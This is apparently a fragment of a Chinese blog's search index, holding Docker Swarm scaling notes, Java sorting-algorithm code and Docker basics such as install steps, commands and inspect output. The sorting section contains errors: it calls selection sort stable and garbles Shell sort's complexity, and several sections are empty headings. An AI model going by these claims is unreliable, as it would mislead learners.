[root@node3 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a92bf0b74b83 nginx:latest \"/docker-entrypoint.…\" 4 minutes ago Up 4 minutes 80/tcp mynginx.1.ndtmy83nj0v3oathgaleiw37v 现在服务只随机创建了一个服务，在node3主机上，假如现在访问量加大，需要扩容： # 创建3个副本 docker service update --replicas 3 mynginx [root@node3 ~]# docker service update --replicas 3 mynginx mynginx overall progress: 3 out of 3 tasks 1/3: running [==================================================\u003e] 2/3: running [==================================================\u003e] 3/3: running [==================================================\u003e] verify: Service converged [root@node3 ~]# docker service ls ID NAME MODE REPLICAS IMAGE PORTS iv9jcn74r0uj mynginx replicated 3/3 nginx:latest *:8888-\u003e80/tcp [root@node3 ~]# docker service inspect mynginx 此时三个服务副本在node3、node4、test主机上 在集群中的任意一个节点都可访问，服务可以有多个副本来实现高可用： 但是现在通过node3IP无法访问服务，其他正常 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:8:1","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"大无语事件来了，有彩蛋: #如果把副本数量讲到1个会怎么样？？降！！！ [root@node3 ~]# docker service update --replicas 1 mynginx mynginx overall progress: 1 out of 1 tasks 1/1: running [==================================================\u003e] verify: Service converged #那就是只有这个一个副本？？？（bug） [root@node3 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a92bf0b74b83 nginx:latest \"/docker-entrypoint.…\" 40 minutes ago Up 40 minutes 80/tcp mynginx.1.ndtmy83nj0v3oathgaleiw37v #发现还是访问不了，查看日志，发现他的日志启动一半，少了许多日志，那就重启 [root@node3 ~]# docker restart mynginx.1.ndtmy83nj0v3oathgaleiw37v mynginx.1.ndtmy83nj0v3oathgaleiw37v [root@node3 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a92bf0b74b83 nginx:latest \"/docker-entrypoint.…\" 42 minutes ago Up About a minute 80/tcp mynginx.1.ndtmy83nj0v3oathgaleiw37v [root@node3 ~]# docker service ls ID NAME MODE REPLICAS IMAGE PORTS iv9jcn74r0uj mynginx replicated 1/1 nginx:latest *:8888-\u003e80/tcp 但是我又发现，怎么会有两个： [root@node2 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2bc639d336dd nginx:latest \"/docker-entrypoint.…\" 13 minutes ago Up 13 minutes 80/tcp mynginx.1.wgk7pwm0mm7zs6fawmb7p6otf [root@node3 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a92bf0b74b83 nginx:latest \"/docker-entrypoint.…\" 55 minutes ago Up 14 minutes 80/tcp mynginx.1.ndtmy83nj0v3oathgaleiw37v 我把其中一个关掉还是不能访问，此时通过mynginx信息发现如下错误： [root@node2 ~]# docker service ps mynginx ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS x8advkit107e mynginx.1 nginx:latest node4 Running Running 6 minutes ago wgk7pwm0mm7z \\_ mynginx.1 nginx:latest node2 Shutdown Complete 6 minutes ago ndtmy83nj0v3 \\_ mynginx.1 nginx:latest node3 Shutdown Failed 25 minutes ago \"task: non-zero exit (137)\" 那就只能重来一遍： docker service rm mynginx docker service create -p 8888:80 --replicas 3 --name mynginxtest nginx [root@node2 ~]# docker service ps mynginxtest ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS fultv05jwsbm mynginxtest.1 nginx:latest localhost.","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:8:2","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"总结 swarm: ​ 集群的管理和编排，docker可以初始化一个swarm集群，其他节点可以加入（manager OR worker） node： ​ 就是一个docker节点，多个节点就组成了一个网络集群 service ​ 就是一个任务，可以在管理节点或者工作节点运行，核心 Task 容器内的命令，细节任务。 service swarm网络：overlay,ingress Docker Stack docker-compose:适合单机部署项目！ docker stack：集群部署项目(已经快被k8s替代了) #单机部署 docker-compose up -d wordpress.yml #集群部署 docker stack deploy wordpress.yml Docker Secret 安全，密码、证书配置： Docker Config 配置： ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:9:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["算法"],"content":"冒泡排序 ​ 冒泡排序是通过比较两个相邻元素的大小实现排序，如果前一个元素大于后一个元素，就交换这两个元素。这样就会让每一趟冒泡都能找到最大一个元素并放到最后。 以 [ 8, 1, 4, 6, 2, 3, 5, 7 ] 为例，对它进行冒泡排序： ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:1:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 public static int[] maopaoSort(int[] array){ boolean isChanged=false; for(int i=0;i\u003carray.length-1;i++){ for(int j=0;j\u003carray.length-1-i;j++){ if(array[j]\u003earray[j+1]){ int temp=array[j+1]; array[j+1]=array[j]; array[j]=temp; isChanged=true; } } } return array; } ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:1:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 稳定性：它是指对同样的数据进行排序，会不会改变它的相对位置。比如 [ 1, 3, 2, 4, 2 ] 经过排序后，两个相同的元素 2 位置会不会被交换。冒泡排序是比较相邻两个元素的大小，显然不会破坏稳定性。 空间复杂度：由于整个排序过程是在原数据上进行操作，故为 O(1); 时间复杂度：由于嵌套了 2 层循环，故为 O(n*n); ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:1:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"选择排序 ​ 选择排序的思想是，依次从「无序列表」中找到一个最小的元素放到「有序列表」的最后面。以 arr = [ 8, 1, 4, 6, 2, 3, 5, 4 ] 为例，排序开始时把 arr 分为有序列表 A = [ ], 无序列表 B = [ 8, 1, 4, 6, 2, 3, 5, 4 ]，依次从 B 中找出最小的元素放到 A 的最后面。这种排序也是逻辑上的分组，实际上不会创建 A 和 B，只是用下标来标记 A 和 B。 ​ 以 arr = [ 8, 1, 4, 6, 2, 3, 5, 4 ] 为例，第一次找到最小元素 1 与 8 进行交换，这时有列表 A = [1], 无序列表 B = [8, 4, 6, 2, 3, 5, 4]；第二次从 B 中找到最小元素 2，与 B 中的第一个元素进行交换，交换后 A = [1，2]，B = [4, 6, 8, 3, 5, 4]；就这样不断缩短 B，扩大 A，最终达到有序。 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:2:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 方法一： public static int[] selectSort(int[] array){ for(int i=0;i\u003carray.length-1;i++){ int index=i; //找出n次无序列表中的最小值和他的下标 for(int j=i;j\u003carray.length;j++){ if(array[j]\u003carray[index]) { index = j; } } int temp=array[index]; array[index]=array[i]; array[i]=temp; } return array; } 方法二： public static int[] selectSort(int[] array){ for(int i=0;i\u003carray.length-1;i++){ int index=i; int temp=999; //找出n次无序列表中的最小值和他的下标 for(int j=i;j\u003carray.length;j++){ if(array[j]\u003carray[index]){ index=j; } temp=array[index]; } //把[i,index]后移一位，给有序增加空位，插入最小值 for(int m=index;m\u003ei;m--){ array[m]=array[m-1]; } array[i]=temp; } return array; } ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:2:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 稳定性：排序过程中元素是按顺序进行遍历，相同元素相对位置不会发生变化，故稳定。 空间复杂度：在原序列进行操作，故为 O( 1 ); 时间复杂度：需要 2 次循环遍历，故为 O( n * n ); ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:2:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"插入排序 ​ 在整个排序过程如图所示，以 arr = [ 8, 1, 4, 6, 2, 3, 5, 7] 为例，它会把 arr 分成两组 A = [ 8 ] 和 B = [ 1, 4, 6, 2, 3, 5, 7] ，逐步遍历 B 中元素插入到 A 中，最终构成一个有序序列： ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:3:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 public static int[] insertSort(int[] array){ for(int i=1;i\u003carray.length;i++){ int preindex=i-1; // 必须记录这个元素，不然会被覆盖掉 int current=array[i]; // 当前元素小于排序好的元素，就移动到下一个位置,从后向前找位置插入 while(preindex\u003e=0\u0026\u0026current\u003carray[preindex]){ array[preindex+1]=array[preindex]; preindex--; } array[preindex+1]=current; } return array; } ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:3:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 稳定性：它是从后往前遍历已排序好的序列，相同元素不会改变位置，故为稳定排序； 空间复杂度：它是在原序列进行排序，故为 O ( 1 ); 时间复杂度：排序的过程中，首先要遍历所有的元素，然后在已排序序列中找到合适的位置并插入。共需要 2 层循环，故为 O ( n * n ); ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:3:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"希尔排序 ​ 希尔排序，它是由 D.L.Shell 于1959 年提出而得名。根据它的名字很难想象算法的核心思想。[ 所以只能死记硬背了，面试官问：希尔排序的思想是什么？]。它的核心思想是把一个序列分组，对分组后的内容进行插入排序，这里的分组只是逻辑上的分组，不会重新开辟存储空间。它其实是插入排序的优化版，插入排序对基本有序的序列性能好，希尔排序利用这一特性把原序列分组，对每个分组进行排序，逐步完成排序。 以 arr = [ 8, 1, 4, 6, 2, 3, 5, 7 ] 为例，通过 floor(8/2) 来分为 4 组，8 表示数组中元素的个数。分完组后，对组内元素进行插入排序。 「 利用第 1 次分组结果进行第 2 次分组 」 「 利用第 2 次分组结果进行最后一次分组 」 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:4:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 public static int[] lshellSort(int[] array){ //len=9 int len=array.length; //floor向下取整，4，2，1 for(int gap=(int)Math.floor(len/2);gap\u003e0;gap=gap/2){ //i=4; for (int i = gap; i \u003c len; i++) { // j=0,1,2,3,4 // [0]-[4] [1]-[5] [2]-[6] [3]-[7] [4]-[8] for (int j = i - gap; j \u003e= 0 \u0026\u0026 array[j] \u003e array[j+gap]; j-=gap) { // 交换位置 int temp = array[j]; array[j] = array[gap+j]; array[gap+j] = temp; } } } return array; } ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:4:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 稳定性：它可能会把相同元素分到不同的组中，那么两个相同的元素就有可能调换相对位置，故不稳定。 空间复杂度：由于整个排序过程是在原数据上进行操作，故为 O(1); 时间复杂度：希尔排序的时间复杂度与增量序列的选取有关，例如希尔增量时间复杂度为O(n²)，而Hibbard增量的希尔排序的时间复杂度为O(log n的3/2)，希尔排序时间复杂度的下界是n*log2n ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:4:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"快速排序 快速排序的核心思想是对待排序序列通过一个「支点」（支点就是序列中的一个元素，别把它想的太高大上）进行拆分，使得左边的数据小于支点，右边的数据大于支点。然后把左边和右边再做一次递归，直到递归结束。支点的选择也是一门大学问，我们以 （左边index + 右边index）/ 2 来选择支点。 以 arr = [ 8, 1, 4, 6, 2, 3, 5, 7 ] 为例，选择一个支点, index= (L+R)/2 = (0+7)/2=3, 支点的值 pivot = arr[index] = arr[3] = 6，接下来需要把 arr 中小于 6 的移到左边，大于 6 的移到右边。 快速排序使用一个高效的方法做数据拆分。 用一个指向左边的游标 i，和指向右边的游标 j，逐渐移动这两个游标，直到找到 arr[i] \u003e 6 和 arr[j] \u003c 6, 停止移动游标，交换 arr[i] 和 arr[j]，交换完后 i++，j–（对下一个元素进行比较），直到 i\u003e=j，停止移动。 图中的 L，R 是指快速排序开始时序列的起始和结束索引，在一趟快速排序中，它们的值不会发生改变，直到下一趟排序时才会改变。 一趟快速排序完成后，分别对小于6和大于等于6的部分进行快速排序，递归就好了。对 [ 5, 1, 4, 3, 2 ] 进行一趟快速排序。 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:5:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:5:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:5:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:6:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:6:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:6:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:7:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:7:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:7:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:8:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:8:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:8:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:9:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:9:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:9:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:10:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:10:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:10:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"排序 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:11:0","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"代码实现 ","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:11:1","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"特点","date":"2021-04-07","objectID":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/:11:2","tags":["排序算法"],"title":"排序算法","uri":"/posts/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"},{"categories":["运维"],"content":"Docker基础、Docker file 、Docker网络","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"从开发到上线，两套环境，版本不同导致软件不可用，开发与运维有差距！部署配置环境费时费力 原：jar——-redis,mysql,jdk,项目能不能带上环境安装打包？跨平台，隔离， docker容器技术也是一种虚拟化技术 官网：https://www.docker.com/ 文档：https://docs.docker.com/ 仓库地址： https://hub.docker.com/ 镜像（image）:模板，通过这个模板来创建容器服务，可创建多个容器（最终服务或者项目运行在容器中） 容器（container）：一个或一组应用，可以启动，停止，删除，基本命令 仓库（repository）：存放镜像（公有私有），docker hub(默认) 阿里云（国内镜像加速） 安装 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:0:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"start 卸载旧版本 # 1、卸载旧版本 sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine # 2、 需要的安装包 sudo yum install -y yum-utils # 3、设置镜像仓库 sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo # 默认是国外的 sudo yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 默认是国外的 可换国内 yum makecache fast # 4、安装相关的额 sudo yum install docker-ce docker-ce-cli containerd.io # 5、启动 sudo systemctl start docker docker version # 6、测试 sudo docker run hello-World 查看镜像 docker images 阿里云镜像加速 sudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u003c\u003c-'EOF' { \"registry-mirrors\": [\"https://ax7mfl6a.mirror.aliyuncs.com\"] } EOF sudo systemctl daemon-reload sudo systemctl restart docker ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:1:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"hello-world流程 sudo docker run hello-World–\u003e本机寻找镜像–No–\u003e仓库地址下载—\u003e是否找到—\u003e下载镜像到本地—\u003e使用镜像创建容器运行 docker常用命令 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:2:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"帮助命令 docker version # 显示版本信息 docker info #系统信息，镜像、容器 docker 命令 --help ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:3:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"镜像命令 docker images docker search mysql docker pull mysql docker pull mysql:5.7 #docker分层下载，节省空间 删除镜像docker rmi -f docker rmi -f 容器id docker rmi -f $(docker images -aq) #删除所有镜像 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:4:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"容器命令 拉取镜像 docker pull centos 创建容器并启动 docker run [可选参数] image # 参数设置 --name=\"name\" 容器名称，tomcat01，tomcat02 -it 交互方式运行， -d 后台运行 -p 指定荣放弃的端口 -p 8080:8080 -p ip:主机端口：容器端口 -p 主机端口：容器端口 -p 容器端口 容器端口 -P 随机指定端口 C:\\Users\\26505\u003edocker pull centos Using default tag: latest latest: Pulling from library/centos 7a0437f04f83: Pulling fs layer latest: Pulling from library/centos 7a0437f04f83: Pull complete Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 Status: Downloaded newer image for centos:latest docker.io/library/centos:latest C:\\Users\\26505\u003edocker run -it centos /bin/bash [root@177a03668b45 /]# exit exit C:\\Users\\26505\u003edocker ps #正在运行的容器 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES bc1f05966db8 mysql \"docker-entrypoint.s…\" 7 hours ago Up 7 hours 33060/tcp, 0.0.0.0:3307-\u003e3306/tcp mysql 741b6a4bccc2 docker/getting-started \"/docker-entrypoint.…\" 7 hours ago Up 7 hours 0.0.0.0:8080-\u003e80/tcp docker-test C:\\Users\\26505\u003edocker ps -a #历史容器 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 177a03668b45 centos \"/bin/bash\" 4 minutes ago Exited (0) 3 minutes ago stoic_rosalind bc1f05966db8 mysql \"docker-entrypoint.s…\" 7 hours ago Up 7 hours 33060/tcp, 0.0.0.0:3307-\u003e3306/tcp mysql 741b6a4bccc2 docker/getting-started \"/docker-entrypoint.…\" 7 hours ago Up 7 hours 0.0.0.0:8080-\u003e80/tcp docker-test 70b02a4a1833 hello-world \"/hello\" 7 hours ago Exited (0) 7 hours ago stupefied_neumann ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:5:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"退出容器 exit #退出并停止容器 ctrl+P+Q #退出终端不停止容器 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:6:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"删除容器 rm -f docker rm 容器id #不能删除正在运行的容器 docker rm -f $(docker pa -aq) #删除全部容器 docker ps -a -q|xargs docker rm #删除全部容器(管道) ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:7:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"启动停止容器 docker start id #启动 docker restart id #重启 docker stop id #停止 docker kill id #强制停止 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:8:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"常用的其他命令 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"后台启动 docker run -d centos #问题 :docker ps 发现centos停止了 # 常见的坑，后台运行后，就必须有一个前台进程，docker发现没有应用，就自动停止了 #nginx 容器启动后，没有提供服务，就会立刻停止 ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:1","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"日志命令 docker logs --help docker logs -tf --tail 10 id #查看后10条日志 docker logs -tf id #查看所有日志 docker run -d centos /bin/sh -C \"while true ;do echo tanjindong;sleep 1;done\" ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:2","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"查看容器中的进程信息 # top命令 docker top --help docker top id ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:9:3","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"查看镜像源数据 # inspect docker inspect id C:\\Users\\26505\u003edocker inspect 741b6a4bccc2 [ { \"Id\": \"741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3\", \"Created\": \"2021-03-21T07:20:22.6575041Z\", \"Path\": \"/docker-entrypoint.sh\", \"Args\": [ \"nginx\", \"-g\", \"daemon off;\" ], \"State\": { \"Status\": \"running\", \"Running\": true, \"Paused\": false, \"Restarting\": false, \"OOMKilled\": false, \"Dead\": false, \"Pid\": 2067, \"ExitCode\": 0, \"Error\": \"\", \"StartedAt\": \"2021-03-21T07:20:26.022246Z\", \"FinishedAt\": \"0001-01-01T00:00:00Z\" }, \"Image\": \"sha256:3ba8f2ff0727d36bccad59f6344f7f3a101bcd9c70b984aa2dd006914c496cb8\", \"ResolvConfPath\": \"/var/lib/docker/containers/741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3/resolv.conf\", \"HostnamePath\": \"/var/lib/docker/containers/741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3/hostname\", \"HostsPath\": \"/var/lib/docker/containers/741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3/hosts\", \"LogPath\": \"/var/lib/docker/containers/741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3/741b6a4bccc29177c95e953ecf827855cba60c91694c46aba6c53ff21fdbbbf3-json.log\", \"Name\": \"/docker-test\", \"RestartCount\": 0, \"Driver\": \"overlay2\", \"Platform\": \"linux\", \"MountLabel\": \"\", \"ProcessLabel\": \"\", \"AppArmorProfile\": \"\", \"ExecIDs\": [ \"4ac8b9a918d39e7560ebf5e35fad12ef83ed66cabc27035095870d4fe13ac56c\" ], \"HostConfig\": { \"Binds\": null, \"ContainerIDFile\": \"\", \"LogConfig\": { \"Type\": \"json-file\", \"Config\": {} }, \"NetworkMode\": \"default\", \"PortBindings\": { \"80/tcp\": [ { \"HostIp\": \"\", \"HostPort\": \"8080\" } ] }, \"RestartPolicy\": { \"Name\": \"no\", \"MaximumRetryCount\": 0 }, \"AutoRemove\": false, \"VolumeDriver\": \"\", \"VolumesFrom\": null, \"CapAdd\": null, \"CapDrop\": null, \"CgroupnsMode\": \"host\", \"Dns\": [], \"DnsOptions\": [], \"DnsSearch\": [], \"ExtraHosts\": null, \"GroupAdd\": null, \"IpcMode\": \"private\", 